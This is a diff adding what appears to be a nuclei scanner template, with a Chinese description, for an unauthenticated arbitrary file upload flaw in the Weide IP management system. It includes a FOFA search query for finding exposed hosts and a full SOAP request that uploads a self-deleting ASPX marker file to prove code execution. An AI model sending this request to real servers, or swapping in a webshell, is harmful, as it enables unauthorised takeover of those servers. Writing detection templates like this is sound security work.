@@ -1,0 +1,47 @@
+id: weide-UploadFileWordTemplate-File-upload
+
+info:
+  tags: weide-UploadFileWordTemplate-File-upload
+  name: 唯徳知识产权管理系统 UploadFileWordTemplate 任意文件上传漏洞
+  author: xc
+  severity: high
+  description: |-
+    fofa: body="JSCOMM/language.js"
+    唯徳知识产权管理系统 /AutoUpdate/WSFM.asmx 接口存在任意文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+
+http:
+  - raw:
+      - |
+        POST /AutoUpdate/WSFM.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/UploadFileWordTemplate"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <UploadFileWordTemplate xmlns="http://tempuri.org/">
+              <fileByteArray>PCVAUGFnZSBMYW5ndWFnZT0iQyMiJT48JVJlc3BvbnNlLldyaXRlKCJwYm95am5ucmZpcG1wbHN1a2RlY3p1ZHNlZnhteXdlIik7U3lzdGVtLklPLkZpbGUuRGVsZXRlKFJlcXVlc3QuUGh5c2ljYWxQYXRoKTslPg==</fileByteArray>
+              <remotePath>/TemplateFiles/{{username}}.aspx</remotePath>
+            </UploadFileWordTemplate>
+          </soap:Body>
+        </soap:Envelope>
+  - raw:
+      - |
+        GET /TemplateFiles/{{username}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'pboyjnnrfipmplsukdeczudsefxmywe'
+      - type: status
+        status: 
+          - 200
